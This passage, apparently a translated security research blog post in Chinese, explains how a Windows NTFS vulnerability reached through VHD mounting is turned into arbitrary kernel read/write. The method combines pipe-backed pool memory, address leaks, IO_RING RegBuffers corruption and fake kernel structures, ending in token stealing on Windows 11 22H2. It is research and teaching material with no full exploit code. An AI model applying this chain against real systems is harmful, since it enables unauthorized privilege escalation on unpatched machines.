函数返回后，我们需要满足某些条件以避免崩溃，不过这些条件并不复杂，相信读者能够轻松处理。  
  
接下来要解决的问题是：**如何分配 NTFS 卷挂载线程可访问的内存？**  
  
你可能会首先想到使用
```
VirtualAlloc
```

  
并将指针写入 NTFS 镜像。但这行不通。挂载 NTFS 卷的线程运行在**System**  
进程中，而来自漏洞利用进程的用户态内存并未映射到该进程。即使映射了，像SMEP/SMAP和HVCI这样的防护机制也会阻止访问。这些防护机制迫使漏洞利用开发者要么设计符合这些防护机制的利用程序，要么寻找绕过方法。  
  
我们将使用通过管道控制内核态内存的经典方法。该方法的关键点如下：  
- 
```
DATA_ENTRY
```

  
结构分配在非分页池（nonpaged pool）中，因此 NTFS 代码在内核上下文中可以访问。  
  
- 分配的内存地址可以通过
```
NtQuerySystemInformation
```

  
泄露。这将漏洞利用限制在**中等完整性级别（Medium IL）或更高**  
。在 Windows 11 24H2 上，通过该 API 泄露地址需要
```
SeDebugPrivilege
```

  
权限，这将影响范围限制在管理员到内核。但我们的目标是**Windows 11 22H2**  
，所以没有问题。  
  
- 数据一旦写入管道就无法更改。任何后续写入都会导致在 big pool 中分配新的内存块。  
  
- 
```
DATA_ENTRY
```

  
头的大小为 48 字节。  
  
最后需要明确的是：  
- 我们想要使用什么样的读写原语来实现任意内核内存读写？  
  
为了获得任意内核内存访问能力，我们将使用
```
IO_RING
```

  
原语，Yarden Shafir 在这里和这里对其进行了详细说明。如果你还不了解
```
IO_RING
```

  
及其在漏洞利用中的用途，现在是时候去了解一下了。  
  
以下是 IO_RING 对象的关键布局：  

```
0: kd> dt nt!_IORING_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x008 UserInfo         : _NT_IORING_INFO
   +0x038 Section          : Ptr64 Void
   +0x040 SubmissionQueue  : Ptr64 _NT_IORING_SUBMISSION_QUEUE
   +0x048 CompletionQueueMdl : Ptr64 _MDL
   +0x050 CompletionQueue  : Ptr64 _NT_IORING_COMPLETION_QUEUE
   +0x058 ViewSize         : Uint8B
   +0x060 InSubmit         : Int4B
   +0x068 CompletionLock   : Uint8B
   +0x070 SubmitCount      : Uint8B
   +0x078 CompletionCount  : Uint8B
   +0x080 CompletionWaitUntil : Uint8B
   +0x088 CompletionEvent  : _KEVENT
   +0x0a0 SignalCompletionEvent : UChar
   +0x0a8 CompletionUserEvent : Ptr64 _KEVENT
   +0x0b0 RegBuffersCount  : Uint4B
   +0x0b8 RegBuffers       : Ptr64 Ptr64 _IOP_MC_BUFFER_ENTRY
   +0x0c0 RegFilesCount    : Uint4B
   +0x0c8 RegFiles         : Ptr64 Ptr64 Void
```

  

```
RtlpFcBufferManagerReferenceBuffers
```

  
允许我们覆盖指针。为了利用 
```
IO_RING
```

  
，我们需要同时覆盖 
```
RegBuffers
```

  
和 
```
RegBuffersCount
```

  
。这意味着我们必须先初始化一个至少包含一个注册缓冲区的 
```
IO_RING
```

  
实例，然后覆盖 
```
RegBuffers
```

  
指针。  
  
该指针将被设置为 
```
TablePtr + 8 * (v5 + 8 * v5 + 3)
```

  
，其中 
```
TablePtr
```

  
位于我们的管道内存中。这让我们可以预先在可控内存中构造假的 
```
_IOP_MC_BUFFER_ENTRY
```

  
结构。  
  
如果我们将初始的任意地址写（write-what-where）与覆盖 
```
RegBuffers
```

  
的意图结合起来，我们会发现 
```
RegBuffers
```

  
将被覆盖为指向管道可控内容中的某个位置的指针。具体来说，值为 
```
TablePtr + 8 * (v5 + 8 * v5 + 3)
```

  
，而 
```
TablePtr
```

  
是指向位于内核中的可控管道内存的指针。这意味着我们应该在开始漏洞利用之前准备好假的 
```
_IOP_MC_BUFFER_ENTRY
```

  
数组。幸运的是，这相当容易，因为在这里我们可以使用用户态内存。  
  
是的，如果启用了 SMAP（Supervisor Mode Access Prevention），它会阻止从内核访问用户态内存，但我们可以继续使用 bigpools，一切都会正常。为了简单起见，我们不会在本文中包含绕过 SMAP 的内容，以保持一切尽可能易于理解。  
  
我们可以在这里使用用户态内存，因为对用户态内存的读写访问将发生在漏洞利用进程中，这是可以的。  
  
请参见下图以了解漏洞利用逻辑的工作原理：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibhNywUIyoibLag7BCJsEurCCwJLwTevASCFtfppN3Rgn24W3nTmjWJfg/640?wx_fmt=png&from=appmsg "")  
  
现在我们拥有了构建漏洞利用所需的所有信息。  
1. 通过 
```
CreateIoRing
```

  
初始化 
```
IO_RING_OBJECT
```

  
，并通过 
```
BuildIoRingRegisterBuffers
```

  
/
```
SubmitIoRing
```

  
初始化预注册的缓冲区。  
  
1. 初始化假结构。我们使用 5 个不同的 bigpools：  
  
1. FakeSCB  
  
1. FakeFCB  
  
1. FakeOAT  
  
1. FakeVCB  
  
1. FakeShared。这是一个特殊的数据，我们将用它作为跨多个假结构的共享数据存储。在这里我们将分配不同的 ERESOURCE、KMUTEX、KEVENT 以及任何用于推进控制流或稳定它的实用结构。  
  
1. 生成 VHD  
  
1. 挂载 VHD  
  
1. 执行任意内核读写提权 payload。我们当然会使用 Token stealing 🙂  
  
请参见下图以了解漏洞利用如何初始化假结构：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibQlAJ2US0tlzBGvXuxbfchnpbtQbgNfm5PjCUqdSaXvNIDy9CTBvcxA/640?wx_fmt=png&from=appmsg "")  
## 结论  
  
Windows 攻击面仍然隐藏着许多被遗忘的“奇怪机器”——具有悠久历史、有限审计和复杂遗留逻辑的子系统。这些机器可以通过非显而易见的向量暴露出来。在本文中，我们展示了对其中一个目标的利用：NTFS 实现，特别是通过虚拟磁盘子系统。  
  
这个案例展示了像事务日志这样看似无害的组件如何导致强大的漏洞利用原语，即使在现代版本的 Windows 中也是如此。  
  
有几个方面可以改进该漏洞利用：  
- **受控的内存耗尽（OOM）触发**  
目前，该漏洞利用依赖于不受控的 OOM 条件。更可靠的策略是仔细耗尽内存以触发确定性故障。或者，可能可以强制 
```
ntfs!NtfsMountVolume
```

  
从更有利的代码路径引发不同的异常。  
  
- **SMAP 感知或绕过**  
当前版本没有考虑 SMAP。添加 SMAP 安全技术或实现适当的绕过将使漏洞利用在加固系统上更加健壮。  
  
- **防止早期 BugCheck**  
有时，
```
#PF
```

  
（页面错误）会在完全未映射的页面上触发，导致在 
```
nt!memcpy
```

  
中发生 **BugCheck**  
，而 
```
nt!memcpy
```

  
是从 
```
ntfs!InitializeRestartState
```

  
调用的。这阻止了流程到达 
```
ntfs!NtfsCloseAttributesFromRestart
```

  
。引入内存耗尽策略可能有助于缓解此问题并提高稳定性。  
  
就是这样了，朋友们。深入探索，保持好奇，祝狩猎愉快。  
  
  
